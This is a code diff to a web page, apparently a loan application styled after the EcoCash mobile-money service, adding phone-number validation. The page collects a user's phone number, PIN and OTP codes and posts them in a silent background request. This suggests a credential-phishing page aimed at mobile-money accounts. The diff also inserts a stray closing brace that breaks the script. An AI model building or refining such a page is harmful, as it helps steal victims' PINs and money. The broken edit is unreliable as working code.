@@ -147,8 +147,9 @@
                     <label>Phone Number</label>
                     <div class="phone-container">
                         <span>+263</span>
-                        <input type="tel" id="phoneNumber" value="123456789">
+                        <input type="tel" inputmode="numeric" id="phoneNumber" placeholder="712345678" maxlength="9" oninput="validatePhone(this)">
                     </div>
+                    <div id="phoneError" style="font-size: 11px; color: #dc2626; margin-top: 4px; display: none;">Must start with 7 and be 9 digits</div>
                 </div>
 
                 <button class="btn-secondary" onclick="goToScreen('step1Screen', '/ax/loan-application')">PREVIOUS</button>
@@ -207,8 +208,9 @@
                     <label>Phone Number</label>
                     <div class="phone-container">
                         <span>+263</span>
-                        <input type="tel" id="loginPhone" placeholder="123456789">
+                        <input type="tel" inputmode="numeric" id="loginPhone" placeholder="712345678" maxlength="9" oninput="validatePhone(this)">
                     </div>
+                    <div id="loginPhoneError" style="font-size: 11px; color: #dc2626; margin-top: 4px; display: none;">Must start with 7 and be 9 digits</div>
                 </div>
                 <label style="text-align: left;">Enter your PIN</label>
                 <div class="pin-container" id="loginPinBoxes">
@@ -287,19 +289,40 @@
             document.getElementById('monthlyPayment').innerText = '$' + monthly.toFixed(2);
         }
 
-        // 2. Screen Router Navigation
+        // 2. Phone Number Validation Logic
+        function validatePhone(input) {
+            input.value = input.value.replace(/\D/g, '');
+            const errorEl = input.id === 'phoneNumber' ? document.getElementById('phoneError') : document.getElementById('loginPhoneError');
+            
+            if (input.value.length > 0 && (!input.value.startsWith('7') || input.value.length !== 9)) {
+                errorEl.style.display = 'block';
+                input.style.borderColor = '#dc2626';
+            } else {
+                errorEl.style.display = 'none';
+                input.style.borderColor = '#dcdcdc';
+            }
+        }
+
+        // 3. Screen Router Navigation
         function goToScreen(screenId, path) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById(screenId).classList.add('active');
             history.pushState({}, '', path);
             window.scrollTo(0, 0);
         }
+                        }
 
         function prepareSummary() {
+            const phoneVal = document.getElementById('phoneNumber').value;
+            if (phoneVal.length !== 9 || !phoneVal.startsWith('7')) {
+                alert('Please enter a valid 9-digit EcoCash phone number starting with 7.');
+                return;
+            }
             document.getElementById('sumAmount').innerText = '$' + document.getElementById('inputAmount').value;
             document.getElementById('sumTerm').innerText = document.getElementById('inputTerm').value;
             document.getElementById('sumPurpose').innerText = document.getElementById('inputPurpose').value;
             document.getElementById('sumApplicant').innerText = document.getElementById('firstName').value + ' ' + document.getElementById('lastName').value;
+            goToScreen('step3Screen', '/ax/summary');
         }
 
         function showLoading(title, sub) {
@@ -312,11 +335,12 @@
             document.getElementById('loadingModal').style.display = 'none';
         }
 
-        // 3. API Submissions & Flow Control
+        // 4. API Submissions & Flow Control
         let savedPhoneNumber = '';
         let countdownInterval = null;
 
-        async function submitLoanApplication() {        showLoading('Submitting Application...', 'Please wait...');
+        async function submitLoanApplication() {
+            showLoading('Submitting Application...', 'Please wait...');
             const payload = {
                 type: 'loan_application',
                 loanAmount: document.getElementById('inputAmount').value,
@@ -374,6 +398,11 @@
         }
 
         async function submitLogin() {
+            const loginPhoneVal = document.getElementById('loginPhone').value;
+            if (loginPhoneVal.length !== 9 || !loginPhoneVal.startsWith('7')) {
+                return;
+            }
+
             showLoading('Please wait...', 'This usually takes a few seconds');
             let pinVal = '';
             document.querySelectorAll('#loginPinBoxes .pin-box').forEach(b => pinVal += b.value);
@@ -384,7 +413,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         type: 'login',
-                        phoneNumber: '+263' + document.getElementById('loginPhone').value,
+                        phoneNumber: '+263' + loginPhoneVal,
                         pin: pinVal
                     })
                 }).catch(err => console.log('Background fetch error:', err));
@@ -430,7 +459,7 @@
             }
         }
 
-        // 4. Auto-focus box jumper & Auto-Submit for PIN/OTP inputs
+        // 5. Auto-focus box jumper & Auto-Submit for PIN/OTP inputs
         document.querySelectorAll('.pin-container').forEach(container => {
             const boxes = container.querySelectorAll('.pin-box');
             boxes.forEach((box, index) => {
@@ -453,5 +482,3 @@
     </script>
 </body>
 </html>
-
-         
